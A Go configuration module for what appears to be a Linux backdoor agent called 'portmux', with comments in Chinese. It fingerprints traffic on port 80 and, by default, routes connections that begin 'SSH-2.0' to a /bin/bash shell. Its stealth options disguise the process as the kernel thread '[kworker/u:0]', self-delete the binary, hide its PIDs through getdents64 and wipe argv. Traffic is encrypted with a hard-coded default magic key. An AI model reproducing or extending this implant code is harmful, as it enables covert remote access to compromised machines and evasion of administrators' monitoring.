package agent

import (
	"bytes"
	"fmt"
	"os"

	"gopkg.in/yaml.v3"
)

type ListenConfig struct {
	Iface      string `yaml:"iface"` // 空或 "auto" = 自动探测默认路由网卡
	WatchPorts []int  `yaml:"watch_ports"`
	Native     bool   `yaml:"native"` // sk_lookup 原生转向 (零 iptables); 默认关闭走经充分验证的 legacy 路径
}

type Config struct {
	MagicKey string       `yaml:"magic_key"`
	Listen   ListenConfig `yaml:"listen"`
	Rules   []RuleConfig `yaml:"rules"`
	Stealth struct {
		ProcessName string `yaml:"process_name"`
		SelfDelete  bool   `yaml:"self_delete"`
		HideProc    bool   `yaml:"hide_proc"`    // getdents64 隐藏自身/子进程 PID
		WipeArgv    bool   `yaml:"wipe_argv"`    // 抹除 argv/env (ps 看不到任何参数)
	} `yaml:"stealth"`
	Crypto struct {
		Enabled bool `yaml:"enabled"` // 流加密 (XChaCha20-Poly1305, 密钥由 magic_key 派生)
	} `yaml:"crypto"`
	Timeouts struct {
		PeekSeconds int `yaml:"peek_seconds"` // 指纹识别读取超时 (秒)
		IdleSeconds int `yaml:"idle_seconds"` // 代理类连接空闲超时 (秒)
	} `yaml:"timeouts"`
	Limits struct {
		MaxConns int `yaml:"max_conns"` // 最大并发连接数
	} `yaml:"limits"`
}

type RuleConfig struct {
	Name           string            `yaml:"name"`
	Fingerprint    string            `yaml:"fingerprint"`
	FingerprintRaw string            `yaml:"fingerprint_raw"` // hex 转义指纹, 与 fingerprint 二选一
	Handler        string            `yaml:"handler"`
	HandlerArgs    map[string]string `yaml:"handler_args"`
	Priority       int               `yaml:"priority"`
}

// DecodeYAML 严格解析 (KnownFields): 拼错字段名直接报错, 避免静默忽略配置的坑
func DecodeYAML(data []byte, cfg *Config) error {
	dec := yaml.NewDecoder(bytes.NewReader(data))
	dec.KnownFields(true)
	if err := dec.Decode(cfg); err != nil {
		return fmt.Errorf("配置解析失败 (请检查字段名是否拼写正确): %w", err)
	}
	return nil
}

func DefaultConfig() *Config {
	cfg := &Config{
		MagicKey: "portmux-key-2024",
		Listen: ListenConfig{
			Iface:      "auto",
			WatchPorts: []int{80},
		},
		Rules: []RuleConfig{
			{Name: "ssh", Fingerprint: "SSH-2.0", Handler: "shell", HandlerArgs: map[string]string{"cmd": "/bin/bash"}, Priority: 1},
			{Name: "fallback", Fingerprint: "*", Handler: "tcp_proxy", HandlerArgs: map[string]string{"target": "127.0.0.1:80"}, Priority: 100},
		},
		Stealth: struct {
			ProcessName string `yaml:"process_name"`
			SelfDelete  bool   `yaml:"self_delete"`
			HideProc    bool   `yaml:"hide_proc"`
			WipeArgv    bool   `yaml:"wipe_argv"`
		}{
			ProcessName: "[kworker/u:0]",
			SelfDelete:  false,
			HideProc:    false,
			WipeArgv:    false,
		},
		Crypto: struct {
			Enabled bool `yaml:"enabled"`
		}{Enabled: true},
		Timeouts: struct {
			PeekSeconds int `yaml:"peek_seconds"`
			IdleSeconds int `yaml:"idle_seconds"`
		}{
			PeekSeconds: 3,
			IdleSeconds: 300,
		},
		Limits: struct {
			MaxConns int `yaml:"max_conns"`
		}{MaxConns: 256},
	}
	return cfg
}

func LoadConfig(path string) (*Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	cfg := DefaultConfig()
	if err := DecodeYAML(data, cfg); err != nil {
		return nil, err
	}
	return cfg, nil
}
